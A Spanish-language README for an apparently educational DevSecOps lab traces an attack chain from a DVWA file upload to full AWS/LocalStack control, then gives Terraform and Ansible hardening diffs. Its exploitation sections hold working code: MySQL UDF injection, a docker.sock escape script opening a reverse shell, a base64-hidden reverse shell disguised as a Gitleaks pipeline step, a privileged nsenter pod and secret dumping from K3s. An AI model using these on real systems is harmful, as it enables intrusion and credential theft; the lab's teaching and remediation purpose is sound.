# DevSecOps Vulnerable Lab — Cadena de Ataque End-to-End & Remediación

> **La seguridad de una infraestructura moderna es una propiedad de su topología, no de sus partes.**
> Este laboratorio lo demuestra recorriendo, capa a capa, el camino que va desde una subida de fichero en una app web pública hasta el control administrativo total de la cuenta cloud que la sostiene.

![Status](https://img.shields.io/badge/status-active-brightgreen)
![License](https://img.shields.io/badge/license-MIT-blue)
![MITRE ATT&CK](https://img.shields.io/badge/MITRE-11%2F14%20tácticas-red)
![Layers](https://img.shields.io/badge/capas-6-8957e5)

<p align="center">
  <img src="docs/animations/01-kill-chain.gif" alt="Cadena de ataque completa, animada de DVWA a IaC" width="860">
  <br><em>De una subida de fichero en DVWA al control total de la cuenta cloud. Ningún paso fue un 0-day.</em>
</p>

<!-- GUION · 01-kill-chain.gif -----------------------------------------------
     6 nodos encendiéndose en secuencia (DVWA → MySQL → Host → CI/CD → K8s → IaC).
     Bajo cada arco aparece la CONDICIÓN que lo hace posible (config.inc.php,
     docker.sock 0777, kubeconfig root, runner secrets, PassRole *).
     ~12 s, loop suave. Formato: GIF o webm ≤ 3 MB.
------------------------------------------------------------------------------>

---

## La tesis

La mayoría de las auditorías —y de los README de laboratorio— tratan las vulnerabilidades como una lista: un puerto aquí, un rol permisivo allá, un secreto en texto plano más allá. Revisadas de forma aislada, casi todas las piezas de este entorno pasarían el corte. El fallo no vive en ningún fichero: **vive en las relaciones entre ellos.**

Este proyecto existe para hacer visible esa diferencia. No se trata de "hackear DVWA" —DVWA es solo la puerta—, sino de mostrar cómo seis decisiones de configuración *razonables por separado* se encadenan hasta convertirse en un compromiso total. De ahí se derivan las cinco ideas que estructuran todo lo demás:

| # | Abstracción | En una frase |
|---|---|---|
| 1 | **El riesgo es emergente, no aditivo** | Las vulnerabilidades se multiplican al tocarse, no se suman. |
| 2 | **Un ataque recorre fronteras de confianza no verificadas** | Cada capa confió en la anterior sin comprobarla. |
| 3 | **La superficie visible y la real están inversamente correlacionadas** | Blindas lo que se ve; el agujero está donde no miras. |
| 4 | **En CI/CD no hay escalada, hay herencia** | El pipeline ya tiene god-mode legítimo; comprometerlo es heredarlo. |
| 5 | **La misma palanca ataca y defiende** | La reproducibilidad del IaC detona un error —o un fix— en todos los entornos a la vez. |

**Stack:** AWS/LocalStack · Terraform · Ansible · Kubernetes (K3s) · Gitea + Act-Runner · DVWA / MySQL

---

## La cadena

Una sola representación canónica. El resto del documento es esta línea, contada despacio.

```
  1 · DVWA        2 · MySQL       3 · Host        4 · CI/CD       5 · K8s         6 · IaC / Cloud
 ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────────┐
 │ File Up. │──▶│ UDF Abuse│──▶│docker.sock──▶│ Pipeline │──▶│ nsenter  │──▶│  PassRole *  │
 │  + LFI   │   │ sys_eval │   │  (0777)  │   │ Poisoning│   │  PID 1   │   │ AssumeRole * │
 └──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────┘   └──────────────┘
   www-data       mysql:999      ROOT host      runner+secrets  cluster-admin   CONTROL TOTAL
      │              │               │              │               │                 │
   validación   FILE priv +     socket montado  secretos en    kubeconfig root   roles IAM
   de upload    creds en        en pod +        texto plano    en /etc/rancher   sobreprivi-
   insuficiente config.inc.php  privileged      (hostPath)     (host)            legiados
```

> **Orden = perspectiva del atacante.** Esta secuencia **no** sigue el orden del stack tecnológico (donde K8s está por debajo del CI/CD), sino el orden en que un atacante real la descubre: empezando por lo expuesto a internet y terminando en la infraestructura que lo define. Nadie tiene acceso directo al Terraform; se llega a él atravesando todo lo demás. Que la narrativa respete ese orden es deliberado.

---

## Arquitectura

<details>
<summary><strong>Mapa, estructura del repo y tabla de controles rotos</strong></summary>

### Mapa mental

Una VPC con una única subnet pública, una EC2 expuesta directamente a internet, un Security Group sin restricción de origen, un bucket S3 sin bloqueo público y roles IAM sobreprivilegiados. A nivel de host, firewall desactivado y `docker.sock` de escritura para cualquiera. En Kubernetes, el runner de CI/CD corre `privileged` con el socket de Docker del host montado dentro.

Ninguna pieza es grave en solitario. Juntas, forman una ruta directa de la app pública al control del proveedor cloud.

### Estructura del repositorio

```
.
├── 01-cloud-iac
│   ├── hardened/            # Misma infraestructura, endurecida
│   └── vulnerable/          # ec2.tf · iam.tf · network.tf · provider.tf · s3.tf
├── 02-provisioning
│   ├── site_hardened.yml
│   └── site_vulnerable.yml
├── 03-k8s-cluster
│   ├── act-runner.yaml
│   └── gitea-deployment.yaml
└── 04-cicd-pipeline
    └── devsecops-demo/
        ├── .gitea/workflows/    # Pipelines CI/CD
        ├── k8s/vulnerable/      # DVWA + MySQL
        └── src/vulnerable/      # Código fuente DVWA
```

> El repo mantiene **ambas versiones en paralelo** (`hardened/` y `vulnerable/`) para cada capa: no solo documenta cómo se rompe, sino cómo se arregla.

### Controles de seguridad rotos

| Control roto | Fichero | Vulnerabilidad | Severidad | Se explota en |
|---|---|---|---|---|
| **Identidad (IAM)** | `iam.tf` | Trust policy con `Principal = "*"` | 🔴 Crítica | Capa 6 |
| **Identidad (IAM)** | `iam.tf` | `iam:PassRole` sin restricción de `Resource` | 🔴 Crítica | Capa 6 |
| **Identidad (IAM)** | `iam.tf` | Usuario con `AdministratorAccess` directo | 🔴 Crítica | Capa 6 |
| **Acceso a red** | `network.tf` | SSH (22) abierto a `0.0.0.0/0` | 🟠 Alta | Capa 3 |
| **Acceso a red** | `network.tf` | Docker API sin cifrar (2375) a `0.0.0.0/0` | 🔴 Crítica* | Capa 3 |
| **Acceso a red** | `network.tf` | Egress sin restricción | 🟠 Alta | Capa 6 |
| **Exposición de datos** | `s3.tf` | Bloqueo de acceso público desactivado | 🟠 Alta | Capa 6 |
| **Exposición de datos** | `s3.tf` | Bucket policy con `Principal = "*"` | 🔴 Crítica | Capa 6 |
| **Aislamiento (host)** | `site_vulnerable.yml` | UFW desactivado | 🟠 Alta | Capa 3 |
| **Aislamiento (host)** | `site_vulnerable.yml` | `docker.sock` con permisos `0777` | 🔴 Crítica | Capa 3 |
| **Aislamiento (contenedor)** | `act-runner.yaml` | Runner en `privileged: true` | 🔴 Crítica | Capa 4 |
| **Aislamiento (contenedor)** | `act-runner.yaml` | `docker.sock` del host montado en el pod | 🔴 Crítica | Capa 4 |
| **Gestión de secretos** | `gitea-deployment.yaml` | `SECRET_KEY`/`INTERNAL_TOKEN`/`JWT_SECRET` hardcodeados | 🟠 Alta | Capa 4 |

> **\* Impacto condicional.** El SG abierto en el puerto 2375 no es explotable *per se*: depende de que la Docker API escuche efectivamente sin autenticación detrás. Es una vulnerabilidad que **amplifica** el daño de otro hallazgo (el socket `0777`), no una puerta de entrada por sí misma. Este matiz —hallazgo de checklist vs. análisis de riesgo real— es el que separa una auditoría seria de un escáner automático.

### Configuración vulnerable (extracto)

```hcl
# iam.tf — cualquiera puede asumir el rol, pasar cualquier rol, y hay un admin directo
resource "aws_iam_role" "overprivileged_role" {
  assume_role_policy = jsonencode({ Statement = [{ Action = "sts:AssumeRole", Effect = "Allow", Principal = "*" }] })
}
resource "aws_iam_policy" "passrole_unrestricted" {
  policy = jsonencode({ Statement = [{ Effect = "Allow", Action = "iam:PassRole", Resource = "*" }] })
}
resource "aws_iam_user_policy_attachment" "user_admin_attach" {
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}
```

```yaml
# site_vulnerable.yml — el punto bisagra entre "acceso al host" y "control de Docker"
- name: Desactivar Firewall (UFW)
  ufw: { state: disabled }
- name: Socket de Docker expuesto a todos los usuarios (0777)
  file: { path: /var/run/docker.sock, mode: '0777' }
```

</details>

---

## Explotación — de DVWA al control total

> ⚠️ **Aviso legal y ético.** Todo esto se ejecuta en un entorno aislado (red local + LocalStack), sin conexión a producción ni a terceros, sobre infraestructura propia desplegada con fines educativos. Reproducir estas técnicas contra sistemas sin autorización explícita es ilegal.

**Prerrequisitos para seguir la sección:** SQL, PHP, Bash/Python y manifiestos K8s a nivel básico; contenedores, orquestación e IaC a nivel conceptual; el lab desplegado (sección de Despliegue) con conectividad Kali (`192.168.252.20`) ↔ clúster (`192.168.252.10`).

<p align="center">
  <img src="docs/animations/02-progress.gif" alt="Barra de progreso de la cadena avanzando capa a capa" width="720">
  <br><em>El estado de la cadena a medida que cae cada capa.</em>
</p>

<!-- GUION · 02-progress.gif ------------------------------------------------
     La línea `[✓] DVWA → [✓] MySQL → ...` marcándose sola, un tick por capa,
     sincronizada con el scroll de las 5 subsecciones. Opcional. ~6 s.
------------------------------------------------------------------------------>

<details open>
<summary><strong>Capa 1 · Acceso inicial — DVWA</strong></summary>

DVWA expone tres vectores directos: SQLi, Command Injection y File Upload/LFI. Se evaluaron los tres y se eligió **File Upload + LFI** por una razón concreta: da una **shell interactiva completa** (PHP arbitrario en el servidor), mientras que la SQLi habría quedado limitada a extracción de datos, sin ejecución de comandos. Para pivotar entre capas, una shell da mucho más control que una inyección ciega.

**Lo que no funcionó (y por qué documentarlo importa).** Antes de decidir por dónde pivotar, se comprobó sistemáticamente si el propio contenedor de DVWA permitía escalar. No permitía nada:

```bash
whoami                                   # → www-data
sudo -l                                  # → sudo: command not found
getcap -r / 2>/dev/null                  # → (vacío: sin binarios con capabilities)
grep Cap /proc/self/status               # → CapEff: 0000000000000000
ls -la /var/run/docker.sock              # → No such file or directory
cat /proc/mounts                         # → solo montajes estándar de K8s, sin binds del host
ls /var/run/secrets/.../serviceaccount/  # → token presente, pero localsubjectrulesreviews → 403
env                                      # → solo variables de Apache, sin credenciales
```

> **Conclusión:** el contenedor de DVWA está **correctamente aislado**. Documentar un negativo no es relleno —es la prueba de que la enumeración fue método, no suerte— y justifica el siguiente pivote en vez de asumirlo.

**El hallazgo decisivo** no vino del escaneo de red (hecho íntegramente en PHP, sin `nmap`), sino de un fichero de configuración de la propia aplicación:

```bash
cat /var/www/html/config/config.inc.php
# $_DVWA['db_user']     = 'app'
# $_DVWA['db_password'] = 'vulnerables'
```

```php
// Verificación de credenciales, solo con PHP (sin nc, sin curl)
php -r '$c=new mysqli("mysql-service","app","vulnerables"); echo $c->connect_error?"FAIL":"OK";'   // → OK
php -r '$c=new mysqli("mysql-service","app","vulnerables"); $r=$c->query("SHOW GRANTS"); while($x=$r->fetch_row()) echo $x[0];'
// → GRANT ALL PRIVILEGES ON `dvwa`.* TO 'app'@'%'
```

#### Ficha de riesgo — DVWA

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 | WAF + validación estricta de extensión/contenido en uploads |
| Execution | Command & Scripting Interpreter: PHP | T1059.004 | Deshabilitar ejecución de scripts en directorios de upload |
| Discovery | Network Service Discovery | T1046 | NetworkPolicy entre namespaces |
| Credential Access | Credentials in Files | T1552.001 | Secretos en Vault/Secrets Manager, nunca en ficheros de app |

> ### 💡 Insight — Capa 1
> La superficie más peligrosa de un entorno real no suele ser el código vulnerable: **son los secretos mal gestionados en ficheros de configuración.** Y el riesgo no estaba en la puerta (DVWA), sino en cómo la puerta se conecta con lo que hay detrás. *Si no es aquí, ¿dónde?* — esa pregunta es la que dirige todo lo que sigue.

</details>

<details>
<summary><strong>Capa 2 · Pivote a MySQL + escape al host</strong></summary>

El diseño coloca deliberadamente el eslabón débil en el pod de **MySQL**, no en DVWA. El manifiesto lo confirma:

```yaml
# mysql-deployment (vulnerable)
securityContext:
  capabilities: { add: [SYS_ADMIN] }
  privileged: true
volumeMounts:
  - { mountPath: /var/run/docker.sock, name: docker-sock }
volumes:
  - hostPath: { path: /var/run/docker.sock, type: Socket }
    name: docker-sock
```

**UDF Abuse — no es "ejecutar un script".** Requiere privilegio `FILE`, conocer la ruta exacta del `plugin_dir` y una `.so` compatible con la arquitectura. Los tres pasos, lanzados desde la shell de DVWA como `www-data`:

```php
// 1 — Subir la librería UDF a una tabla auxiliar (hex)
$so  = file_get_contents("https://raw.githubusercontent.com/Rapid7/metasploit-framework/master/data/exploits/mysql/lib_mysqludf_sys_64.so");
$c   = new mysqli("mysql-service","app","vulnerables","dvwa");
$c->query("CREATE TABLE IF NOT EXISTS udf_blob(line LONGBLOB)");
$c->query("INSERT INTO udf_blob VALUES(UNHEX('".bin2hex($so)."'))");

// 2 — Volcar la .so al plugin_dir
$c->query("SELECT line FROM udf_blob INTO DUMPFILE '/usr/lib64/mysql/plugin/udf_sys.so'");

// 3 — Registrar sys_eval y confirmar RCE
$c->query("CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf_sys.so'");
$r = $c->query("SELECT sys_eval('id') AS cmd")->fetch_assoc();
// → uid=999(mysql) gid=999(mysql)
```

**Escape al host vía Docker Engine API sobre el socket Unix.** Sin CLI de Docker, sin `curl`: se habla el protocolo REST a mano.

<p align="center">
  <img src="docs/animations/03-docker-escape.gif" alt="Escape de contenedor a root en el host vía docker.sock" width="820">
  <br><em>El momento más denso: contenedor MySQL → contenedor efímero con <code>Binds: /:/mnt/host</code> → root en el nodo real.</em>
</p>

<!-- GUION · 03-docker-escape.gif -------------------------------------------
     Split screen: izquierda el pod MySQL (uid 999), derecha el host.
     Se dibuja la petición HTTP cruda al socket, nace `escape1` (alpine),
     el chroot al host montado, y el prompt cambia a root@host. ~15 s.
------------------------------------------------------------------------------>

```python
# escape.py — crea un contenedor efímero con el host montado y NetworkMode host
import socket, json, base64
cmd = "chroot /mnt/host /bin/bash -c 'bash -i >& /dev/tcp/192.168.252.20/5555 0>&1'"
payload = json.dumps({
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh","-c","echo "+base64.b64encode(cmd.encode()).decode()+" | base64 -d | sh"],
    "HostConfig": {"Binds": ["/:/mnt/host"], "NetworkMode": "host", "Privileged": True}
})
s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s.connect("/var/run/docker.sock")
s.sendall(("POST /containers/create?name=escape1 HTTP/1.1\r\nHost: localhost\r\n"
           "Content-Type: application/json\r\nContent-Length: %d\r\n\r\n%s" % (len(payload), payload)).encode())
s2 = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM); s2.connect("/var/run/docker.sock")
s2.sendall(b"POST /containers/escape1/start HTTP/1.1\r\nHost: localhost\r\n\r\n")
```

<details>
<summary>Por qué el payload es así (decisiones de diseño, no casualidad)</summary>

- **`alpine` y no `mysql:5.7`** — la imagen de MySQL no trae `mount`/`chroot`/`nsenter`; Alpine sí.
- **`NetworkMode: host`** — sin esto el contenedor efímero cae en la bridge por defecto (`172.17.0.0/16`) y la reverse shell hacia `192.168.252.20` muere en silencio por el NAT. Con `host`, comparte la pila de red sin NAT.
- **`Binds: ["/:/mnt/host"]` y no `mount --bind`** — `Binds` lo resuelve el *daemon* antes de arrancar; hacerlo a mano dentro del comando genera conflictos de punto de montaje y exige `mount` en la imagen.
- **Base64** — evita el infierno de quoting anidado que hace el script frágil.
- **Sin f-strings** — el contenedor de MySQL corre Python 2. Concatenación con `+`.

</details>

Si la conexión llega al `nc -lvnp 5555`, la shell es **root en el host real**, no en un contenedor: el `chroot` al filesystem del host montado convierte el entorno en el del anfitrión.

#### Ficha de riesgo — MySQL / Escape

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Execution | Exploitation for Client Execution (UDF Abuse) | T1203 | Restringir `FILE` priv; `secure_file_priv` acotado |
| Privilege Escalation | Escape to Host | T1611 | Nunca montar `docker.sock` en pods; rootless / gVisor |
| Privilege Escalation | Container Privileged | T1548 | Prohibir `privileged`/`SYS_ADMIN` vía PSA / OPA |
| Lateral Movement | Container Administration Command | T1021.007 | TLS mutuo obligatorio en el Docker Engine API |

> ### 💡 Insight — Capa 2
> Mínimo privilegio no es una regla que se aplica: es **una pregunta que se hace**. *¿Qué razón legítima tiene un servicio de base de datos para hablar con el daemon de Docker?* Ninguna. Cada permiso que no responde a una necesidad concreta es una frontera de confianza regalada — y el aislamiento del contenedor era una promesa, no un muro. `docker.sock` lo volvió decorativo.

</details>

<details>
<summary><strong>Capa 3 · CI/CD — Gitea / Act-Runner</strong></summary>

Con root en el host, sus datos —persistidos vía `hostPath`— son directamente legibles:

```bash
cat /var/lib/gitea-data/app.ini
# [security] SECRET_KEY = secretkeylabdevsecops
#            INTERNAL_TOKEN = eyJhbGci...
# [oauth2]   JWT_SECRET = eyJhbGci...
```

`SECRET_KEY` cifra las cookies de sesión, `INTERNAL_TOKEN` autentica la comunicación interna, `JWT_SECRET` firma los tokens OAuth2. Con cualquiera en texto plano, un atacante **forja sesiones o tokens válidos sin credenciales de ningún usuario**. El manifiesto del runner, además, expone su token de registro en el propio comando de arranque.

**Poisoned Pipeline Execution (PPE).** No es "modificar un YAML": es que el runner ejecuta código arbitrario en el **mismo contexto** que los jobs legítimos —con `docker.sock` del host y `privileged: true`—. El vector se disfraza de paso inofensivo:

```yaml
- name: Gitleaks Scan
  continue-on-error: true          # el job se reporta OK aunque el paso legítimo falle
  run: |
    nohup bash -c "$(echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1Mi4yMC80NDg4IDA+JjEn | base64 -d)" >/dev/null 2>&1 &
    gitleaks detect --source="."   # → decodificado: bash -i >& /dev/tcp/192.168.252.20/4488 0>&1
```

El base64 + `continue-on-error` no es casualidad: una revisión superficial de PR ve "escaneo de secretos", no una reverse shell, y el pipeline se reporta verde.

#### Ficha de riesgo — CI/CD

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Execution | Supply Chain Compromise (CI/CD) | T1195.002 | CODEOWNERS + protected branches en `.gitea/workflows/` |
| Credential Access | Credentials in Files | T1552.001 | Secretos fuera del ConfigMap (gestor de secretos) |
| Persistence | Compromise Infrastructure: CI/CD | T1584 | Runners efímeros, sin `privileged` ni socket |
| Defense Evasion | Obfuscated Files or Information | T1027 | Escaneo estático de workflows (patrón `base64 -d \| sh`) |

> ### 💡 Insight — Capa 3
> Aquí el concepto de "escalada de privilegios" se disuelve: **no hay escalada, hay herencia.** El pipeline ya tenía acceso *legítimo* a todo lo que necesita para desplegar —`kubeconfig`, credenciales cloud, claves de firma—. El atacante no explota nada nuevo: hereda exactamente el poder del proceso de despliegue. En la práctica, **la seguridad del CI/CD *es* la seguridad de toda la infraestructura que gestiona.**

</details>

<details>
<summary><strong>Capa 4 · Kubernetes (K3s)</strong></summary>

**Dos vías, no una.** El `kubeconfig` de `cluster-admin` es legible desde el host (`/etc/rancher/k3s/k3s.yaml`) tras el escape de la Capa 2; alternativamente, el Act-Runner suele tener credenciales de despliegue equivalentes inyectadas como secreto. Documentar ambas importa porque en un entorno real rara vez se dispone de las dos.

**Pod malicioso + salto al PID 1 del host:**

```yaml
# malicious-pod.yaml
apiVersion: v1
kind: Pod
metadata: { name: pwned-node }
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: c
    image: alpine:latest
    command: ["/bin/sh","-c","nsenter -t 1 -m -u -i -n sh"]
    securityContext: { privileged: true }
    volumeMounts: [{ mountPath: /host, name: host-root }]
  volumes: [{ name: host-root, hostPath: { path: / } }]
```

<p align="center">
  <img src="docs/animations/04-nsenter.gif" alt="Salto al namespace PID 1 del host vía nsenter" width="820">
  <br><em><code>nsenter -t 1 -m -u -i -n sh</code>: entrar al namespace del init es indistinguible de una sesión root nativa en el nodo.</em>
</p>

<!-- GUION · 04-nsenter.gif -------------------------------------------------
     El pod `pwned-node` aplicándose; flecha desde el contenedor al proceso
     PID 1 del host; el prompt se convierte en root del nodo. ~10 s.
------------------------------------------------------------------------------>

**El hallazgo de `state.db` (Kine).** K3s no usa `etcd` por defecto, sino **Kine** sobre SQLite en disco. Los Secrets están ahí en base64 y **sin cifrado en reposo** salvo que se active `--secrets-encryption`:

```bash
sqlite3 /var/lib/rancher/k3s/server/db/state.db "SELECT name,value FROM kine WHERE name LIKE '%secrets%';"
echo "<valor>" | base64 -d        # incluidas las credenciales AWS que usa el CI/CD
```

#### Ficha de riesgo — Kubernetes

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Privilege Escalation | Escape to Host | T1611 | PSA `restricted`; prohibir `hostPID`/`hostNetwork`/`hostPath` |
| Credential Access | Unsecured Credentials: Kine DB | T1552.007 | `--secrets-encryption`; migrar a `etcd` cifrado |
| Discovery | Permission Groups Discovery: K8s | T1069.003 | RBAC de mínimo privilegio; auditoría de bindings a `cluster-admin` |
| Impact | Data Encrypted/Destruction (potencial) | T1486/T1485 | Backups inmutables; alertas sobre pods `privileged` |

> ### 💡 Insight — Capa 4
> **Kubernetes añade abstracción, no aislamiento.** Un pod `privileged: true` + `hostPath: /` es funcionalmente idéntico a root en el nodo, solo que con más YAML de por medio. La orquestación da una falsa sensación de contención que muchos equipos no cuestionan hasta que alguien la atraviesa.

</details>

<details>
<summary><strong>Capa 5 · IaC / Cloud — el objetivo final</strong></summary>

Con las credenciales AWS extraídas de Kine (o del runner), los tres hallazgos leídos en el código de la Arquitectura ahora se **demuestran en explotación real**:

```bash
export AWS_ACCESS_KEY_ID=<extraído>; export AWS_SECRET_ACCESS_KEY=<extraído>
aws sts get-caller-identity --endpoint-url=http://192.168.252.10:4566

aws iam list-attached-user-policies --user-name dev-user-admin --endpoint-url=...
# → arn:aws:iam::aws:policy/AdministratorAccess

aws sts assume-role --role-arn arn:aws:iam::000000000000:role/devsecops-unrestricted-role \
  --role-session-name pwn --endpoint-url=...        # → éxito: trust policy Principal: "*"

aws s3 cp ./payload.txt s3://devsecops-public-data-bucket/ --no-sign-request   # sin credenciales
```

**Por qué `iam:PassRole` sin restricción es crítico y no "más de lo mismo".** No es tener permisos altos: es la capacidad de **asignar cualquier rol de la cuenta a cualquier servicio**. Es escalada permanente y, a diferencia de un `AdministratorAccess` visible, casi indetectable en auditoría superficial: el usuario parece de bajo privilegio pero puede *convertirse* en cualquier rol bajo demanda.

**El cierre del círculo.** Cada configuración que hizo posible la cadena —el SG abierto, el `docker.sock` en `0777`, los pods `privileged`— se desplegó **desde aquí**, de forma automatizada, vía Terraform y Ansible. El IaC no es solo el objetivo final: es también el origen de todas las condiciones que lo permitieron.

#### Ficha de riesgo — IaC / Cloud

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Privilege Escalation | Valid Accounts: Cloud Accounts | T1078.004 | IAM mínimo privilegio; revisión de `AdministratorAccess` |
| Privilege Escalation | PassRole (IAM) | T1548 | `Resource` acotado en toda policy con `iam:PassRole` |
| Initial Access | Trusted Relationship / Valid Accounts | T1199/T1078 | `Principal` explícito, nunca `"*"` |
| Exfiltration | Exfiltration to Cloud Storage | T1567.002 | S3 Block Public Access a nivel de cuenta |

> ### 💡 Insight — Capa 5 (cierre de la cadena)
> Ningún paso individual fue un 0-day. Cada uno aprovechó una decisión que, aislada, parecía razonable —una comodidad de desarrollo, un valor por defecto, una prisa— pero que resultó inapropiada en un entorno con **conectividad real entre capas**. El ataque empezó con una subida de fichero y terminó con control administrativo de la cuenta. Eso es exactamente lo que una auditoría seria busca encontrar: **antes de que lo encuentre un atacante.**

</details>

---

## Remediación y hardening

> No es un checklist de "cosas a cambiar". Para cada vulnerabilidad se documenta el **diff**, el **control** que restaura, y —lo que de verdad importa— el **control sistémico** que evita que ese *tipo* de error vuelva a aparecer. Parchear es tratar el síntoma; arreglar es tratar el proceso.

<p align="center">
  <img src="docs/animations/05-diff-toggle.gif" alt="Toggle entre versión vulnerable y hardened del mismo fichero" width="820">
  <br><em>Vulnerable ⇄ hardened sobre el mismo fichero: lo que demuestra capacidad de <strong>remediar</strong>, no solo de atacar.</em>
</p>

<!-- GUION · 05-diff-toggle.gif ---------------------------------------------
     Un fichero (p. ej. iam.tf) alternando entre las dos versiones, con las
     líneas rojas (-) desapareciendo y las verdes (+) entrando. ~8 s, loop.
------------------------------------------------------------------------------>

### Resumen ejecutivo

| Capa | Vulnerabilidad | Fix | Pre | Post | Control sistémico |
|---|---|---|:--:|:--:|---|
| IAM | `Principal = "*"` en trust policy | `Principal` a ARN concreto + `ExternalId` | 🔴 | 🟢 | `tfsec`/`checkov` en PR |
| IAM | `PassRole` con `Resource = "*"` | `Resource` acotado por ARN | 🔴 | 🟢 | SCPs en AWS Organizations |
| IAM | `AdministratorAccess` directo | Política de mínimo privilegio | 🔴 | 🟢 | IAM Access Analyzer |
| Red | SSH + Docker API a `0.0.0.0/0` | CIDR restringido; 2375 eliminado | 🟠 | 🟢 | `tfsec aws-ec2-no-public-ingress-sgr` |
| S3 | Bucket público (`Put`/`Get` `*`) | Block Public Access + policy eliminada | 🔴 | 🟢 | S3 BPA a nivel de cuenta |
| Host | UFW deshabilitado | UFW `deny` + ingress explícito | 🟠 | 🟢 | `ansible-lint` + `inspec` |
| Host | `docker.sock` `0777` | `0660`, grupo `docker` | 🔴 | 🟢 | Docker rootless |
| K8s | `privileged` + `hostPath: /` | `privileged: false`, sin `hostPath` | 🔴 | 🟢 | Pod Security Admission `restricted` |
| K8s | Kine sin cifrado | `--secrets-encryption` | 🟠 | 🟠 | Migración a `etcd` cifrado |
| CI/CD | Secretos en ConfigMap | Secret / OIDC federation | 🔴 | 🟢 | Gitleaks pre-commit + OIDC |
| CI/CD | Runner `privileged` + socket | Runner sin socket; Kaniko/Buildah | 🔴 | 🟢 | Runners efímeros |
| App | Secretos en `config.inc.php` | K8s Secret montado como env | 🟠 | 🟢 | External Secrets Operator / Vault |

<details>
<summary><strong>Diffs · IaC (Terraform)</strong></summary>

```diff
# iam.tf
- Principal = "*"
+ Principal = { AWS = "arn:aws:iam::${var.account_id}:root" }
+ Condition = { StringEquals = { "sts:ExternalId" = var.external_id } }

- Action = "iam:PassRole"
- Resource = "*"
+ Action   = "iam:PassRole"
+ Resource = ["arn:aws:iam::${var.account_id}:role/devsecops-ec2-role"]

- policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
+ policy_arn = aws_iam_policy.minimal_privilege_policy.arn
```

```diff
# network.tf
- ingress { from_port = 22,   cidr_blocks = ["0.0.0.0/0"] }
+ ingress { from_port = 22,   cidr_blocks = [var.admin_cidr] }
- ingress { from_port = 2375, cidr_blocks = ["0.0.0.0/0"] }   # Docker API sin cifrar
+ # (regla 2375 eliminada — usar SSH tunneling o TLS 2376)
- egress  { protocol = "-1",  cidr_blocks = ["0.0.0.0/0"] }
+ egress  { from_port = 443, protocol = "tcp", cidr_blocks = ["0.0.0.0/0"] }
```

```diff
# s3.tf
- block_public_acls = false ; block_public_policy = false ; ignore_public_acls = false ; restrict_public_buckets = false
+ block_public_acls = true  ; block_public_policy = true  ; ignore_public_acls = true  ; restrict_public_buckets = true
- # bucket policy con Principal = "*"
+ # (aws_s3_bucket_policy eliminado; + SSE-KMS y versioning habilitados)
```

<details><summary>Versión hardened completa (para copiar-pegar)</summary>

```hcl
# iam.tf — hardened
resource "aws_iam_role" "restricted_role" {
  name = "devsecops-restricted-role"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action = "sts:AssumeRole", Effect = "Allow"
      Principal = { AWS = "arn:aws:iam::${var.account_id}:root" }
      Condition = { StringEquals = { "sts:ExternalId" = var.external_id } }
    }]
  })
}
resource "aws_iam_policy" "passrole_restricted" {
  name   = "PassRoleRestrictedPolicy"
  policy = jsonencode({ Version = "2012-10-17", Statement = [{
    Effect = "Allow", Action = "iam:PassRole",
    Resource = ["arn:aws:iam::${var.account_id}:role/devsecops-ec2-role"]
  }]})
}
resource "aws_iam_policy" "minimal_privilege_policy" {
  name   = "DevsecopsMinimalPolicy"
  policy = jsonencode({ Version = "2012-10-17", Statement = [{
    Effect = "Allow", Action = ["s3:GetObject","ec2:DescribeInstances"], Resource = "*"
  }]})
}

# network.tf — hardened
resource "aws_security_group" "hardened_sg" {
  name = "restricted-management-sg"; vpc_id = aws_vpc.hardened_vpc.id
  ingress { description = "SSH admin only", from_port = 22, to_port = 22, protocol = "tcp", cidr_blocks = [var.admin_cidr] }
  egress  { description = "HTTPS out",      from_port = 443, to_port = 443, protocol = "tcp", cidr_blocks = ["0.0.0.0/0"] }
  egress  { description = "HTTP out",       from_port = 80,  to_port = 80,  protocol = "tcp", cidr_blocks = ["0.0.0.0/0"] }
}

# s3.tf — hardened
resource "aws_s3_bucket_public_access_block" "block_all" {
  bucket = aws_s3_bucket.private_bucket.id
  block_public_acls = true; block_public_policy = true; ignore_public_acls = true; restrict_public_buckets = true
}
resource "aws_s3_bucket_server_side_encryption_configuration" "sse" {
  bucket = aws_s3_bucket.private_bucket.id
  rule { apply_server_side_encryption_by_default { sse_algorithm = "aws:kms" } }
}
```
</details>

**Control restaurado:** mínimo privilegio en las tres dimensiones de IAM (quién asume, qué delega, qué hace) + denegación por defecto en red + cierre de exposición de datos.
**Control sistémico:** `tfsec`/`checkov` bloquean `Principal:*`, `PassRole Resource:*` y adjuntos de admin **antes** del `apply`; **S3 Block Public Access a nivel de cuenta** invalida cualquier policy pública en todos los buckets de una sola llamada —el control de mayor impacto/esfuerzo de esta capa—.

</details>

<details>
<summary><strong>Diffs · Provisioning (Ansible)</strong></summary>

```diff
- - name: Desactivar Firewall (UFW)
-   ufw: { state: disabled }
+ - name: Habilitar UFW con política deny por defecto
+   ufw: { state: enabled, policy: deny }
+ - name: Permitir SSH solo desde red de administración
+   ufw: { rule: allow, port: 22, proto: tcp, src: "{{ admin_network_cidr }}" }

- - name: Socket de Docker 0777
-   file: { path: /var/run/docker.sock, mode: '0777' }
+ - name: Socket de Docker restringido al grupo docker
+   file: { path: /var/run/docker.sock, owner: root, group: docker, mode: '0660' }
+ - name: Deshabilitar Docker API sin cifrar (2375)
+   lineinfile: { path: /etc/docker/daemon.json, line: '{"hosts":["unix:///var/run/docker.sock"]}', create: yes }
+ - name: Auditoría del socket de Docker
